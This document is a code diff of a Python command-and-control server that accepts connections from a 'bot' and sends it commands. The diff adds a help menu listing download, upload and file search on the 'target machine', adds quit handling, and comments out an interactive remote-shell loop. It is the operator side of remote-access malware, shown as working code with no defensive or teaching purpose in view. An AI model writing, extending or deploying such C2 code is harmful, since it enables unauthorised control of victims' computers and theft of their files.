@@ -149,6 +149,14 @@ def receive_data(socket):
     full_data = b''.join(fragments)
     return full_data
 
+def help_menu():
+    print("Commands:")
+    print("download - Downloads a file from the target machine")
+    print("upload - Uploads a file to the target machine")
+    print("search - Searches for a file on the target machine")
+    print("quit - Exits the program")
+    print("help - Displays this menu")
+
 def main():
     c2_server = socket.socket()
     c2_server.bind(("0.0.0.0", 8000))
@@ -181,23 +189,16 @@ def main():
                 full_data = receive_data(client)
                 decoded_data = base64_decode(full_data)
                 print(decoded_data.decode())
+            elif command.lower() == "quit":
+                client.send(command.encode())
+                user_continue = False
+                client.close()
+            elif command.lower() == "help":
+                help_menu()
+            
             # Check to see if the user entered quit
             else:
                 client.send(command.encode())
-                if command.lower() == "shell":
-                    while True:
-                        full_data = client.recv(4096).decode()
-                        sys.stdout.write(full_data)
-                        command = input()
-
-                        #Send the command to the bot
-                        command += "\n"
-                        client.send(command.encode())
-                        time.sleep(1)
-
-                        #Remove the output of the 'input' function
-                        sys.stdout.write("\033[A" + full_data.split("\n")[-1])
-
                 if command.lower() == "quit":
                     user_continue = False
                 # Receive the data from the bot
@@ -208,3 +209,18 @@ def main():
         exit()
 
 main()
+
+
+ # if command.lower() == "shell":
+                #     while True:
+                #         full_data = client.recv(4096).decode()
+                #         sys.stdout.write(full_data)
+                #         command = input()
+
+                #         #Send the command to the bot
+                #         command += "\n"
+                #         client.send(command.encode())
+                #         time.sleep(1)
+
+                #         #Remove the output of the 'input' function
+                #         sys.stdout.write("\033[A" + full_data.split("\n")[-1])
